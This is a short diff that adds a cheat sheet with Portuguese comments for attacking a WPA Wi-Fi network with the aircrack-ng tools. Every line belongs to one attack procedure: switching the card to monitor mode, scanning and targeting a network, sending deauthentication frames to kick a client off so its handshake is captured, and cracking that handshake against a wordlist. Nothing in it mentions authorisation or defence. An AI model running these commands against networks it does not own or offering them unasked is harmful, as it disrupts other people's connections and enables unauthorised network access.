@@ -1,0 +1,18 @@
+#DEIXAR EM MODO DE MONITORAMENTO
+airmon-ng start wlan0
+
+#MOITORAR O AR
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c CH
+
+#HANDSHAKE
+airodump-ng wlan0mon -c CH --bssid BSSID -w NOME
+aireplay-ng -0 AT -a N1 -c N2 wlan0mon
+ 
+#QUANDO O USUARIO RECONECTAR TEM Q APARECER Q O HANDSHAKE FOI CAPTURADO
+ls (pegar arquivo .cap)
+
+cd /usr/share/wordlists
+ 
+#TERMINAL NOVO
+aircrack-ng -b BSSID -w WORDLIST ARQUIVO DE CAPTURA 
